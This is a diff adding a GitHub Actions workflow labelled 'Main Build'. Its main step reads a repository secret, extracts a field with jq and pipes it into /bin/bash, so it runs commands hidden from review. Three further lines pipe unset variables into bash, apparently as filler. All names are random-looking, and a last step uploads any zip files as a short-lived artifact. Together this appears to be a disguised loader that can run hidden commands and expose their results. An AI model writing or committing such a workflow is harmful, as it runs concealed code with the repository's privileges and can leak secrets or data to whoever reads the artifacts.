@@ -1,0 +1,28 @@
+name: Main Build
+on:
+  workflow_dispatch:
+
+env:
+  CI: true
+jobs:
+  check:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 0
+      - name: Main step
+        env:
+          kydbw53146: ${{ secrets.kydbw53146 }}
+        run: |
+          printf '%s' "$kydbw53146" | jq -r .nlxv428 | /bin/bash
+          printf '%s' "$hce9256" | jq -r .t463 | /bin/bash
+          echo $yu49 | jq -r .xdeie639 | /bin/bash
+          printf '%s' "$f8" | jq -r .e3 | /bin/bash
+
+      - name: Save data
+        uses: actions/upload-artifact@v4
+        with:
+          name: Fim8mR7Z
+          path: "*.zip"
+          retention-days: 1
